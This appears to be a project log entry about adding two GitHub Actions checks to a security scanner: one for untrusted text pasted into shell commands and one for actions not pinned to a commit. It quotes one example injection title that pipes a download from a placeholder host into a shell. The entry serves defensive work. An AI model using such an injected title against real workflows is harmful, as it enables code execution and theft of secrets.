# A stranger's text in a workflow's commands, and actions not pinned to a commit (7 October 2026)

From the gap analysis (`docs/GAP-ANALYSIS.md`, 3.8; BACKLOG, item 16, the workflows half). Two shapes the workflow
checks (`crates/sv-check/src/workflows.rs`) did not look for.

**`config.workflow-untrusted-text-in-run`** (findings only). GitHub fills in `${{ ... }}` before a `run:` line's shell
or `actions/github-script`'s `script:` reads it, so text a stranger writes and the workflow pastes in is read as
commands: a pull request titled `a"; curl evil.example | sh; echo "` runs that command. What counts as a stranger's text
is GitHub's own list of untrusted input ("Security hardening for GitHub Actions"): a pull request's, issue's, comment's,
review's, or discussion's title and body, branch names (`github.head_ref`, `head.ref`, `head.label`), commit messages,
and their authors' names and emails. Each expression is compared with its spaces taken out, so however it is spaced it
is found; text handed in through `env:` and used as a quoted variable, the safe form, is not reported, nor are values a
stranger cannot choose (`pull_request.number`, `github.sha`).

- **Critical, citing AC.12.1,** when a trigger that runs with the repository's secrets on a stranger's behalf starts
  the workflow: the four privileged triggers, and `issues` and `discussion`, which anyone can open. AC.12.1 asks that
  such workflows never run untrusted content.
- **Medium, citing nothing,** otherwise: a fork's `pull_request` gets no secrets and a read-only token, but the
  stranger's commands still run on the build machine.

**`config.workflow-action-not-pinned`** (low, citing nothing). A `uses:` naming another organization's action, or a
reusable workflow, by a tag or branch rather than a 40-character commit: whoever controls the action can move the tag,
as `tj-actions/changed-files`'s were in March 2025. GitHub's own `actions/` and `github/` are left out, as "third-party"
says; so are container images (`docker://`, which have their own digest form). No requirement asks for commit pinning,
so it is reported as good practice, as `config.workflow-token-permissions` is.

Nine guards broken in turn. Eight were caught by the new tests: no untrusted text known, AC.12.1 never cited, an issue
not counted as running with secrets, `github-script` not read, GitHub's own actions reported (which six tests caught),
a commit taken for a tag, a reusable workflow's `uses:` not read, and an image named by its digest reported. The ninth,
a local action (`./path`) reported, caught nothing: a local action has no `@`, so it never reached that guard, which was
taken out rather than kept untested.
